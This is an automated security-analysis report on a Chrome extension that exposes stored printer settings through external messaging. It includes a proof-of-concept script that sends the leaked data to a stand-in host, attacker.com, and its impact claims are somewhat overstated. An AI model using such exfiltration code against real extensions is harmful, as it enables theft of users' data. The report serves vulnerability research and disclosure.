# CoCo Analysis: ceooaenfaondhgmdjiabmameibajmhch

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ceooaenfaondhgmdjiabmameibajmhch/opgen_generated_files/bg.js
Line 751	var storage_local_get_source = { 'key': 'value' };
Line 984	sendResponse(items.printerName);

**Code:**

```javascript
// Background script - External message listener
chrome.runtime.onMessageExternal.addListener(
  async function(req, sender, sendResponse) {
    if(req==="getPrinterName"){
        chrome.storage.local.get({
          printerName: '',
          printerPath: 'PRN',
          hasScale: false
        }, function(items) {
          sendResponse(items.printerName); // ← Line 984: Stored data sent to external attacker
        });
    } else if(req==="hasScale"){
        sendResponse(true);
    } else if(req==="open"){
        await initStorageCache;
        promise = new Promise((success) => {
            success(chrome.runtime.connectNative('systextil.print'));
        });
        promise = promise.then(port => {
            port.postMessage({ open: storageCache.printerPath }); // ← printerPath also exposed
            return port;
        });
    }
    // ... other handlers
  }
);

// Storage initialization
const storageCache = { printerPath: 'PRN' };
const initStorageCache = chrome.storage.local.get({
    printerName: '',
    printerPath: 'PRN',
    hasScale: false
}).then((items) => {
    Object.assign(storageCache, items);
});

// manifest.json externally_connectable
// "externally_connectable": {
//     "matches": ["*://*.systextil.com.br/*", "*://*.grupolunelli.com/*"]
// }
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From a malicious webpage matching externally_connectable pattern
// (e.g., attacker-controlled subdomain on *.systextil.com.br or *.grupolunelli.com)

// Request printer name from extension storage
chrome.runtime.sendMessage('ceooaenfaondhgmdjiabmameibajmhch',
    "getPrinterName",
    function(printerName) {
        console.log('Leaked printer name:', printerName);
        // Send to attacker server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify({printerName: printerName})
        });
    }
);

// Request hasScale setting
chrome.runtime.sendMessage('ceooaenfaondhgmdjiabmameibajmhch',
    "hasScale",
    function(hasScale) {
        console.log('Leaked hasScale:', hasScale);
    }
);
```

**Impact:** Information disclosure. An external attacker from any website matching the externally_connectable whitelist (*.systextil.com.br or *.grupolunelli.com) can send messages to the extension and retrieve the user's stored printer configuration settings (printerName, printerPath, hasScale). While printer names may seem low-severity, this information can be used for device fingerprinting, tracking users across sessions, or gaining insights into the user's local system configuration. The vulnerability demonstrates a complete storage exploitation chain where an attacker can read arbitrary stored data via external messaging without any authentication or validation.
